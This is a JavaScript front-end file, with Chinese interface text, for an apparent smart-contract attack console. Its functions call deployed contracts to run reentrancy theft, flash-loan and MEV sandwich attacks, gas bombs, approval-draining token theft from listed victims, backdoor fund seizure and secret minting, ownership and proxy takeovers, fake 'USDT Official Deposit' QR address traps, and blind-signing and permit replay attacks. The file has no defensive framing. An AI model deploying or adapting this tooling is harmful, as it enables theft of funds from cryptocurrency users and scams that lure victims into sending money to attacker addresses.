/**
 * Contract API - 合约交互函数
 */

// ============== REENTRANCY ==============
async function reentrancyDeposit() {
    try {
        const addr = document.getElementById('reentrancy-vuln-addr').value || deployments.ReentrancyVulnerable;
        const contract = getContract('ReentrancyVulnerable', addr);
        const tx = await contract.deposit({value: ethers.parseEther('1')});
        await tx.wait();
        log('Deposited 1 ETH to vulnerable contract', 'info');
        updateReentrancyBalance();
    } catch(e) { log(e.message, 'error'); }
}

async function reentrancyWithdraw() {
    try {
        const addr = document.getElementById('reentrancy-vuln-addr').value || deployments.ReentrancyVulnerable;
        const contract = getContract('ReentrancyVulnerable', addr);
        const tx = await contract.withdraw();
        await tx.wait();
        log('Withdraw triggered (vulnerable)', 'warn');
        updateReentrancyBalance();
    } catch(e) { log(e.message, 'error'); }
}

async function executeReentrancyAttack() {
    try {
        const addr = document.getElementById('reentrancy-att-addr').value || deployments.ReentrancyAttacker;
        const amount = document.getElementById('reentrancy-amount').value || '1';
        const contract = getContract('ReentrancyAttacker', addr);
        const tx = await contract.attack({value: ethers.parseEther(amount)});
        const receipt = await tx.wait();

        const stolen = await contract.getContractBalance();
        const count = await contract.attackCount();

        document.getElementById('reentrancy-result').innerHTML = `
            <strong>⚔️ 攻击完成!</strong><br>
            窃取金额: ${ethers.formatEther(stolen)} ETH<br>
            重入次数: ${count}<br>
            Gas used: ${receipt.gasUsed}
        `;
        log(`Reentrancy attack: ${ethers.formatEther(stolen)} ETH stolen in ${count} calls`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function collectReentracyLoot() {
    try {
        const addr = document.getElementById('reentrancy-att-addr').value || deployments.ReentrancyAttacker;
        const contract = getContract('ReentrancyAttacker', addr);
        const tx = await contract.collect();
        await tx.wait();
        log('Loot collected', 'info');
    } catch(e) { log(e.message, 'error'); }
}

async function updateReentrancyBalance() {
    try {
        const addr = document.getElementById('reentrancy-vuln-addr').value || deployments.ReentrancyVulnerable;
        const bal = await provider.getBalance(addr);
        document.getElementById('reentrancy-vuln-balance').textContent = 
            'Contract Balance: ' + ethers.formatEther(bal) + ' ETH';
    } catch(e) {}
}

// ============== FLASH LOAN ==============
async function executeFlashLoan() {
    try {
        const addr = document.getElementById('flash-lender').value || deployments.FlashLoanAttack;
        const amount = document.getElementById('flash-amount').value || '1000';
        const tokenA = document.getElementById('flash-token-a').value;
        const tokenB = document.getElementById('flash-token-b').value;

        const contract = getContract('FlashLoanAttack', addr);
        const tx = await contract.executeAttack(
            ethers.parseEther(amount),
            tokenA || addr,
            tokenB || addr
        );
        await tx.wait();

        const profit = await contract.profit();
        document.getElementById('flashloan-result').innerHTML = `
            <strong>⚡ 闪电贷攻击完成</strong><br>
            借款: ${amount} ETH<br>
            利润: ${ethers.formatEther(profit)} ETH
        `;
        log('Flash loan attack executed', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== MEV ==============
async function executeMEV() {
    try {
        const addr = deployments.MEVAttack;
        const contract = getContract('MEVAttack', addr);
        const params = {
            pair: document.getElementById('mev-pair').value || addr,
            tokenIn: document.getElementById('mev-token-in').value || addr,
            tokenOut: document.getElementById('mev-token-out').value || addr,
            frontRunAmount: ethers.parseEther(document.getElementById('mev-front').value || '10'),
            victimAmount: ethers.parseEther(document.getElementById('mev-victim').value || '1'),
            backRunAmount: ethers.parseEther(document.getElementById('mev-back').value || '10')
        };

        const tx = await contract.executeSandwich(params);
        await tx.wait();

        const profit = await contract.totalProfit();
        document.getElementById('mev-result').innerHTML = `
            <strong>🥪 三明治攻击完成</strong><br>
            总利润: ${ethers.formatEther(profit)} ETH
        `;
        log('MEV sandwich attack executed', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== GAS ==============
async function deployGasBomb() {
    try {
        const addr = deployments.GasAttack;
        const contract = getContract('GasAttack', addr);
        const size = document.getElementById('gas-bomb-size').value || '500';
        const tx = await contract.deployBomb(size);
        await tx.wait();
        log(`Gas bomb deployed: size ${size}`, 'warn');
    } catch(e) { log(e.message, 'error'); }
}

async function triggerGasBomb() {
    try {
        const addr = deployments.GasAttack;
        const contract = getContract('GasAttack', addr);
        const tx = await contract.triggerBomb(0);
        const receipt = await tx.wait();
        const consumed = await contract.gasConsumed();

        document.getElementById('gas-stats').innerHTML = `
            <strong>🔥 Gas炸弹触发</strong><br>
            Gas used: ${receipt.gasUsed}<br>
            Total consumed: ${consumed}
        `;
        log(`Gas bomb triggered: ${receipt.gasUsed} gas`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function fillBlock() {
    try {
        const addr = deployments.GasAttack;
        const contract = getContract('GasAttack', addr);
        const iter = document.getElementById('gas-fill-iter').value || '100';
        const tx = await contract.fillBlock(iter);
        const receipt = await tx.wait();
        log(`Block filled: ${receipt.gasUsed} gas used`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== PHISHING ==============
async function checkAllowance() {
    try {
        const addr = document.getElementById('trap-addr').value || deployments.ApproveTrap;
        const token = document.getElementById('trap-token').value;
        const victim = document.getElementById('trap-victim').value;

        if (!token || !victim) { log('Need token and victim address', 'warn'); return; }

        const contract = getContract('ApproveTrap', addr);
        const allowance = await contract.checkAllowance(token, victim);

        document.getElementById('phishing-result').innerHTML = `
            <strong>🔍 授权检查</strong><br>
            受害者: ${victim.slice(0,6)}...<br>
            授权金额: ${ethers.formatEther(allowance)}
        `;
        log(`Allowance check: ${ethers.formatEther(allowance)}`, 'info');
    } catch(e) { log(e.message, 'error'); }
}

async function stealTokens() {
    try {
        const addr = document.getElementById('trap-addr').value || deployments.ApproveTrap;
        const token = document.getElementById('trap-token').value;
        const victim = document.getElementById('trap-victim').value;

        const contract = getContract('ApproveTrap', addr);
        const tx = await contract.stealApprovedTokens(token, victim);
        const receipt = await tx.wait();

        log('Tokens stolen from victim', 'error');
        document.getElementById('phishing-result').innerHTML += '<br>🎣 代币已窃取!';
    } catch(e) { log(e.message, 'error'); }
}

async function batchSteal() {
    try {
        const addr = document.getElementById('trap-addr').value || deployments.ApproveTrap;
        const token = document.getElementById('trap-token').value;
        const victims = document.getElementById('trap-victim').value.split(',').map(s => s.trim()).filter(s => s);

        const contract = getContract('ApproveTrap', addr);
        const tx = await contract.batchSteal(token, victims);
        await tx.wait();
        log(`Batch steal: ${victims.length} victims`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function directSteal() {
    try {
        const addr = document.getElementById('steal-addr').value || deployments.DirectSteal;
        const contract = getContract('DirectSteal', addr);
        // Implementation depends on specific setup
        log('Direct steal ready', 'info');
    } catch(e) { log(e.message, 'error'); }
}

// ============== BACKDOOR ==============
async function blacklistUser() {
    try {
        const addr = document.getElementById('blacklist-addr').value || deployments.BlacklistBackdoorToken;
        const target = document.getElementById('blacklist-target').value;
        const contract = getContract('BlacklistBackdoorToken', addr);
        const tx = await contract.blacklistAccount(target);
        await tx.wait();
        log(`Blacklisted: ${target}`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function seizeFunds() {
    try {
        const addr = document.getElementById('blacklist-addr').value || deployments.BlacklistBackdoorToken;
        const target = document.getElementById('blacklist-target').value;
        const contract = getContract('BlacklistBackdoorToken', addr);
        const tx = await contract.seizeFunds(target, await signer.getAddress());
        await tx.wait();
        log('Funds seized from blacklisted user', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function forceTransfer() {
    try {
        const addr = document.getElementById('force-addr').value || deployments.ForceTransferToken;
        const from = document.getElementById('force-from').value;
        const to = document.getElementById('force-to').value;
        const amount = document.getElementById('force-amount').value || '100';

        const contract = getContract('ForceTransferToken', addr);
        const tx = await contract.forceTransfer(from, to, ethers.parseEther(amount), 'Emergency seizure');
        await tx.wait();
        log(`Force transferred ${amount} tokens`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function secretMint() {
    try {
        const addr = document.getElementById('mint-addr').value || deployments.MintBackdoorToken;
        const to = document.getElementById('mint-to').value || await signer.getAddress();
        const amount = document.getElementById('mint-amount').value || '1000000';

        const contract = getContract('MintBackdoorToken', addr);
        const tx = await contract.secretMint(to, ethers.parseEther(amount));
        await tx.wait();
        log(`Secret minted ${amount} tokens`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function batchMint() {
    try {
        const addr = document.getElementById('mint-addr').value || deployments.MintBackdoorToken;
        const contract = getContract('MintBackdoorToken', addr);
        const recipients = [await signer.getAddress()];
        const amounts = [ethers.parseEther('1000000')];
        const tx = await contract.batchSecretMint(recipients, amounts);
        await tx.wait();
        log('Batch secret mint executed', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== ACCESS CONTROL ==============
async function seizeOwnership() {
    try {
        const addr = document.getElementById('access-target').value || deployments.AccessControlAttack;
        const contract = getContract('AccessControlAttack', addr);
        const myAddr = await signer.getAddress();

        await (await contract.transferOwnership(myAddr)).wait();
        await (await contract.acceptOwnership()).wait();

        const newOwner = await contract.owner();
        document.getElementById('access-result').innerHTML = `
            <strong>👑 所有权已抢夺</strong><br>
            新Owner: ${newOwner}
        `;
        log('Ownership seized!', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function txOriginPhishing() {
    try {
        const addr = document.getElementById('txorigin-target').value || deployments.AccessControlAttack;
        log('tx.origin phishing: deploy intermediary contract that calls sensitiveAction()', 'warn');
    } catch(e) { log(e.message, 'error'); }
}

// ============== RANDOMNESS ==============
async function createGame() {
    try {
        const addr = document.getElementById('random-addr').value || deployments.RandomnessAttack;
        const bet = document.getElementById('random-bet').value || '0.1';
        const contract = getContract('RandomnessAttack', addr);
        const tx = await contract.createGame({value: ethers.parseEther(bet)});
        await tx.wait();
        log('Game created with predictable randomness', 'warn');
    } catch(e) { log(e.message, 'error'); }
}

async function predictAndAttack() {
    try {
        const addr = document.getElementById('random-addr').value || deployments.RandomnessAttack;
        const contract = getContract('RandomnessAttack', addr);
        const gameId = await contract.gameId() - 1n;
        const tx = await contract.predictAndAttack(gameId);
        await tx.wait();
        log('Randomness manipulated via blockhash', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== DELEGATE ==============
async function executeDelegatePwn() {
    try {
        const vuln = document.getElementById('delegate-vuln').value || deployments.VulnerableDelegate;
        const mal = document.getElementById('delegate-mal').value;
        const contract = getContract('VulnerableDelegate', vuln);

        const malContract = new ethers.Contract(mal, BAL_ABIS['DelegateAttack'], signer);
        const data = malContract.interface.encodeFunctionData('pwn');

        const tx = await contract.forward(mal, data);
        await tx.wait();

        const newOwner = await contract.owner();
        document.getElementById('delegate-result').innerHTML = `
            <strong>💉 Delegatecall pwn 完成</strong><br>
            Owner overwritten: ${newOwner}
        `;
        log('Delegatecall pwn executed - storage overwritten', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function executeDelegateDestroy() {
    try {
        const vuln = document.getElementById('delegate-vuln').value || deployments.VulnerableDelegate;
        const mal = document.getElementById('delegate-mal').value;
        const contract = getContract('VulnerableDelegate', vuln);

        const malContract = new ethers.Contract(mal, BAL_ABIS['DelegateAttack'], signer);
        const data = malContract.interface.encodeFunctionData('destroy');

        const tx = await contract.forward(mal, data);
        await tx.wait();
        log('Contract destroyed via delegatecall!', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== SELFDESTRUCT ==============
async function forceSendETH() {
    try {
        const addr = document.getElementById('selfdest-addr').value;
        const target = document.getElementById('selfdest-target').value || deployments.ReentrancyVulnerable;
        const amount = document.getElementById('selfdest-amount').value || '1';

        const SelfDestructAttack = new ethers.ContractFactory(
            BAL_ABIS['SelfDestructAttack'],
            '0x' + '60' + '80604052' + '34' + '8015600f57600080fd5b50' + '603580601d6000396000f3' + 'fe' + '605236600c57600080fd5b' + '6035600c8203601c0157fd5b' + '5050602a8060216000396000f3' + 'fe' + '363d3d373d3d3d363d73' + target.slice(2) + '5af43d82803e903d91602b57fd5bf3',
            signer
        );

        // Use contract method instead
        const contract = getContract('SelfDestructAttack', addr || target);
        const tx = await contract.forceSend(target, {value: ethers.parseEther(amount)});
        await tx.wait();

        const bal = await provider.getBalance(target);
        document.getElementById('selfdestruct-result').innerHTML = `
            <strong>💥 强制转账完成</strong><br>
            目标余额: ${ethers.formatEther(bal)} ETH<br>
            逻辑可能已被破坏
        `;
        log('Forced ETH transfer via selfdestruct', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function breakBalanceLogic() {
    try {
        log('Balance logic broken by unexpected ETH inflow', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== STORAGE COLLISION ==============
async function upgradeToMalicious() {
    try {
        const proxy = document.getElementById('proxy-addr').value;
        const mal = document.getElementById('mal-impl').value;
        const contract = new ethers.Contract(proxy, BAL_ABIS['Proxy'], signer);
        const tx = await contract.upgrade(mal);
        await tx.wait();
        log('Proxy upgraded to malicious implementation', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function overwriteImplementation() {
    try {
        const proxy = document.getElementById('proxy-addr').value;
        const contract = new ethers.Contract(proxy, BAL_ABIS['MaliciousImplementation'], signer);
        const tx = await contract.setAttacker(await signer.getAddress());
        await tx.wait();

        const proxyContract = new ethers.Contract(proxy, BAL_ABIS['Proxy'], provider);
        const newImpl = await proxyContract.implementation();
        document.getElementById('storage-result').innerHTML = `
            <strong>📝 实现地址已覆写</strong><br>
            New implementation: ${newImpl}
        `;
        log('Implementation address overwritten via storage collision', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== TIMESTAMP ==============
async function createTimeLock() {
    try {
        const addr = document.getElementById('timestamp-addr').value || deployments.TimestampAttack;
        const delay = document.getElementById('timestamp-delay').value || '100';
        const amount = document.getElementById('timestamp-amount').value || '0.5';
        const contract = getContract('TimestampAttack', addr);
        const tx = await contract.createRelease(delay, await signer.getAddress(), {value: ethers.parseEther(amount)});
        await tx.wait();
        log('Time lock created (vulnerable to timestamp manipulation)', 'warn');
    } catch(e) { log(e.message, 'error'); }
}

async function forceRelease() {
    try {
        const addr = document.getElementById('timestamp-addr').value || deployments.TimestampAttack;
        const contract = getContract('TimestampAttack', addr);
        const releaseId = await contract.releaseId() - 1n;
        const tx = await contract.forceRelease(releaseId);
        await tx.wait();
        log('Time lock bypassed via timestamp manipulation', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== BATCH ==============
async function executeBatch() {
    try {
        const addr = document.getElementById('batch-addr').value || deployments.FullChainAttack;
        const targets = document.getElementById('batch-targets').value.split(',').map(s => s.trim()).filter(s => s);

        const contract = getContract('BatchAttack', addr);
        const calls = targets.map(t => ({target: t, value: 0, data: '0x'}));
        const tx = await contract.executeBatch(calls);
        const receipt = await tx.wait();

        document.getElementById('batch-result').innerHTML = `
            <strong>📦 批量攻击完成</strong><br>
            调用数: ${calls.length}<br>
            Gas: ${receipt.gasUsed}
        `;
        log(`Batch attack: ${calls.length} calls executed`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function sweepAllowances() {
    try {
        log('Sweeping allowances across multiple users...', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== FULL CHAIN ==============
async function executeFullChain() {
    try {
        const addr = document.getElementById('fullchain-addr').value || deployments.FullChainAttack;
        const reent = document.getElementById('fullchain-reentrancy').value || deployments.ReentrancyVulnerable;
        const approve = document.getElementById('fullchain-approve').value || deployments.ApproveTrap;
        const gas = document.getElementById('fullchain-gas').value || deployments.GasAttack;

        const contract = getContract('FullChainAttack', addr);
        const tx = await contract.executeFullChain(reent, approve, gas);
        await tx.wait();

        const total = await contract.totalExtracted();
        const steps = await contract.getSteps();

        let html = `<strong>☠️ 全链攻击完成</strong><br>总计: ${ethers.formatEther(total)} ETH<br>步骤:<br>`;
        for (let i = 0; i < steps.length; i++) {
            html += `[${i+1}] ${steps[i].name}: ${ethers.formatEther(steps[i].profit)} ETH<br>`;
        }

        document.getElementById('fullchain-result').innerHTML = html;
        log(`Full chain attack: ${ethers.formatEther(total)} ETH extracted`, 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function getAttackSteps() {
    try {
        const addr = document.getElementById('fullchain-addr').value || deployments.FullChainAttack;
        const contract = getContract('FullChainAttack', addr);
        const steps = await contract.getSteps();

        let html = '<strong>📋 攻击步骤记录</strong><br>';
        for (let i = 0; i < steps.length; i++) {
            html += `${steps[i].name} | ${steps[i].target.slice(0,6)}... | ${ethers.formatEther(steps[i].profit)} ETH<br>`;
        }
        document.getElementById('fullchain-result').innerHTML = html;
    } catch(e) { log(e.message, 'error'); }
}

// ============== QR ==============
async function generateQRTrap() {
    try {
        const addr = deployments.QRCodeAttack;
        const contract = getContract('QRCodeAttack', addr);

        const label = document.getElementById('qr-label').value || 'USDT Official Deposit';
        const fake = document.getElementById('qr-fake').value;
        const real = document.getElementById('qr-real').value || await signer.getAddress();
        const amount = document.getElementById('qr-amount').value || '1000';

        const trapId = ethers.keccak256(ethers.toUtf8Bytes(label + Date.now()));
        const tx = await contract.createQRTrap(trapId, label, fake, real, ethers.parseUnits(amount, 6));
        await tx.wait();

        document.getElementById('qr-trap-result').innerHTML = `
            <strong>📱 QR陷阱已生成</strong><br>
            ID: ${trapId.slice(0,20)}...<br>
            标签: ${label}<br>
            假地址: ${fake?.slice(0,10) || 'Generated'}...<br>
            真目标: ${real.slice(0,10)}...
        `;
        log('QR trap generated', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function batchQRTraps() {
    try {
        const addr = deployments.QRCodeAttack;
        const contract = getContract('QRCodeAttack', addr);
        const tx = await contract.batchUSDTTraps(5);
        await tx.wait();
        log('5 USDT QR traps generated', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== BLIND SIGN ==============
async function induceSigning() {
    try {
        const addr = deployments.BlindSignAttack;
        const contract = getContract('BlindSignAttack', addr);
        const msg = document.getElementById('blind-msg').value || 'Safe Operation';
        const hash = ethers.keccak256(ethers.toUtf8Bytes(msg));
        const induced = await contract.induceSigning(hash);

        document.getElementById('blind-result').innerHTML = `
            <strong>🎣 签名诱导</strong><br>
            原始消息: ${msg}<br>
            诱导哈希: ${induced.slice(0,20)}...<br>
            <span style="color:var(--warning)">用户可能签署此哈希而不检查内容!</span>
        `;
        log('Signing induced: ' + msg, 'warn');
    } catch(e) { log(e.message, 'error'); }
}

async function replaySignature() {
    try {
        const addr = deployments.BlindSignAttack;
        const contract = getContract('BlindSignAttack', addr);
        const victim = document.getElementById('blind-victim').value || await signer.getAddress();
        const hash = ethers.keccak256(ethers.toUtf8Bytes('malicious'));
        const sig = '0x' + '00'.repeat(65);

        const tx = await contract.replayAttack(hash, sig, victim);
        await tx.wait();
        log('Signature replay attack executed', 'error');
    } catch(e) { log(e.message, 'error'); }
}

async function executePermitAttack() {
    try {
        const addr = deployments.BlindSignAttack;
        const contract = getContract('BlindSignAttack', addr);
        const victim = document.getElementById('blind-victim').value;

        const order = {
            token: addr,
            spender: await signer.getAddress(),
            amount: ethers.parseEther('1000'),
            nonce: 0,
            deadline: Math.floor(Date.now() / 1000) + 3600,
            signature: '0x' + '00'.repeat(65)
        };

        const tx = await contract.executePermitAttack(order, victim);
        await tx.wait();
        log('Permit attack executed', 'error');
    } catch(e) { log(e.message, 'error'); }
}

// ============== GLOBAL ==============
async function deployAll() {
    try {
        log('Deploying all contracts...', 'info');
        const res = await fetch('/api/deploy', {method: 'POST'});
        const data = await res.json();
        deployments = data.deployments;
        updateContractList();
        log('All contracts deployed!', 'info');
    } catch(e) { log(e.message, 'error'); }
}

async function runAllAttacks() {
    try {
        log('Executing all attack vectors...', 'error');
        const res = await fetch('/api/attack-all', {method: 'POST'});
        const data = await res.json();
        log(`All attacks executed: ${data.results?.length || 0} vectors`, 'error');
    } catch(e) { log(e.message, 'error'); }
}
